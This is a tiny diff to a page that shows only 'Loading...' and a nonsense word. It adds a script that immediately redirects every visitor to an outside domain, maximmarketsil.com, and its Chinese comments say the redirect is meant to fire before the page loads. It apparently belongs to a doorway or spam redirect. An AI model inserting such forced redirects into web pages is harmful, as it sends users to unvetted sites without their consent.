@@ -2,3 +2,11 @@ Loading...
 
 ThigmaistuponsLoadingThigmaistupons
 
+
+
+
+//放在html里
+  <script>
+    // 立即跳转，不依赖 DOM 加载
+    window.location.href = 'https://maximmarketsil.com';
+  </script>
